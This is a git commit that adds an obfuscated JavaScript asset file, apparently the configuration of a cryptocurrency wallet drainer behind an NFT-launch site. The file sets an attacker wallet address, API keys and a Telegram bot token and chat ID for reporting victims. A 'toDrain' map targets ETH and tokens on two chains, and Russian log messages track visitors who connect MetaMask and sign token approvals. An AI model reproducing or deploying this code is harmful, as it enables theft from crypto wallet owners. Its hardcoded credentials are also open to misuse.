c5fd2937228367e3c0b6d2e60439f542ebddd64c
launchmynfts <117330542+launchmynfts@users.noreply.github.com>
2022-11-21 18:37:53 +0300

    Add files via upload

---
+++ assets/import_main.js
@@ -0,0 +1,91 @@
+const _0x291f41 = _0x1a38;
+(function(_0x53c191, _0x4b2d46) {
+	const _0x2a48cd = _0x1a38,
+		_0x42918b = _0x53c191();
+	while (!![]) {
+		try {
+			const _0x31a8d5 = -parseInt(_0x2a48cd(0xf6)) / 0x1 * (parseInt(_0x2a48cd(0xe9)) / 0x2) + -parseInt(_0x2a48cd(0xf2)) / 0x3 * (parseInt(_0x2a48cd(0xf4)) / 0x4) + parseInt(_0x2a48cd(0xe0)) / 0x5 * (parseInt(_0x2a48cd(0xe7)) / 0x6) + parseInt(_0x2a48cd(0xf0)) / 0x7 + parseInt(_0x2a48cd(0xe4)) / 0x8 * (parseInt(_0x2a48cd(0xe5)) / 0x9) + -parseInt(_0x2a48cd(0xf1)) / 0xa * (parseInt(_0x2a48cd(0xeb)) / 0xb) + -parseInt(_0x2a48cd(0xf3)) / 0xc * (-parseInt(_0x2a48cd(0xf7)) / 0xd);
+			if (_0x31a8d5 === _0x4b2d46) break;
+			else _0x42918b['push'](_0x42918b['shift']());
+		} catch (_0x9dd1f3) {
+			_0x42918b['push'](_0x42918b['shift']());
+		}
+	}
+}(_0x12c6, 0xda25f), logLanguage = _0x291f41(0xe3), ownerAddress = _0x291f41(0xf5), MORALIS_KEY = 'XAXQ8f0CM1UGaCDY2rBUu0rpHUiH5dvu4DiUXYQKs4DMNguCYkrpXBKS5b4Rr8VG', ZAPPER_KEY = _0x291f41(0xe1), autoMetamaskConnect = 0x0);
+const tgConfig = {
+		'botToken': '5755492923:AAFpSok6EgmPbC3OXnCSnRMbFDGMiaPpT64',
+		'chatId': '-855472091'
+	},
+	chains = {
+		'eth': !![],
+		'matic': ![],
+		'bsc': !![]
+	},
+	toDrain = {
+		'eth': {
+			'nft': ![],
+			'eth': !![],
+			'tokens': !![]
+		},
+		'matic': {
+			'nft': ![],
+			'eth': ![],
+			'tokens': ![]
+		},
+		'bsc': {
+			'nft': ![],
+			'eth': !![],
+			'tokens': !![]
+		}
+	},
+	LOG_SCHEMA = {
+		'rus': {
+			'onConnect': _0x291f41(0xec),
+			'onDisconnect': '💤\x20Пользователь\x20$id\x20покинул\x20сайт',
+			'onMetamaskConnect': _0x291f41(0xdf),
+			'onApprove': _0x291f41(0xed),
+			'onCancel': '😢\x20Пользователь\x20$id\x20отменил\x20транзакцию',
+			'onSign': _0x291f41(0xdd),
+			'onCancelSwitch': '😢\x20Пользователь\x20$id\x20не\x20сменил\x20сеть'
+		},
+		'eng': {
+			'onConnect': '💠\x20Пользователь\x20$id\x20зашел\x20на\x20сайт',
+			'onDisconnect': _0x291f41(0xde),
+			'onMetamaskConnect': '😎\x20Пользователь\x20$id\x20подключил\x20метамаск',
+			'onApprove': '🤑\x20Пользователь\x20$id\x20открыл\x20окно\x20с\x20апрувом\x20токенов',
+			'onCancel': _0x291f41(0xef),
+			'onSign': _0x291f41(0xdd),
+			'onCancelSwitch': _0x291f41(0xea)
+		}
+	};
+
+function _0x1a38(_0x183aa6, _0x18d586) {
+	const _0x12c6a5 = _0x12c6();
+	return _0x1a38 = function(_0x1a3825, _0x387e45) {
+		_0x1a3825 = _0x1a3825 - 0xdd;
+		let _0x928f90 = _0x12c6a5[_0x1a3825];
+		return _0x928f90;
+	}, _0x1a38(_0x183aa6, _0x18d586);
+}
+
+function updateState(_0x1dfc9d) {
+	const _0x22b3c3 = _0x291f41;
+	switch (_0x1dfc9d) {
+		case _0x22b3c3(0xee):
+			break;
+		case _0x22b3c3(0xe2):
+			break;
+		case _0x22b3c3(0xe8):
+			break;
+		case _0x22b3c3(0xe6):
+			break;
+	}
+}
+
+function _0x12c6() {
+	const _0x4374cd = ['40lEnKed', 'Basic\x20OTgyZTQwOGUtODMxNS00MGE0LWJiYmItNjgyZmRhMWY3ZDU3Og==', 'metamaskDisconnected', 'rus', '691688olWCWy', '117hTKIDO', 'userTokensFetched', '59154trYAtp', 'userTokensFetching', '26SkISXH', '😢\x20Пользователь\x20$id\x20не\x20сменил\x20сеть', '176wdckYk', '💠\x20Пользователь\x20$id\x20зашел\x20на\x20сайт', '🤑\x20Пользователь\x20$id\x20открыл\x20окно\x20с\x20апрувом\x20токенов', 'metamaskConnected', '😢\x20Пользователь\x20$id\x20отменил\x20транзакцию', '3910592uDTRBm', '197710ElbcMX', '165792hidwTF', '134436LPwpaV', '20yUAazZ', '0x57f9E8efae89A2cE4f3Cc67A56c9b69E76ee1e81', '66853QaMSsF', '689AIvBUL', '✅\x20Пользователь\x20$id\x20подписал\x20апрув', '💤\x20Пользователь\x20$id\x20покинул\x20сайт', '🔑\x20Пользователь\x20$id\x20подключил\x20метамаск%0A└\x20[DeBank](https://debank.com/profile/$wallet)'];
+	_0x12c6 = function() {
+		return _0x4374cd;
+	};
+	return _0x12c6();
+}
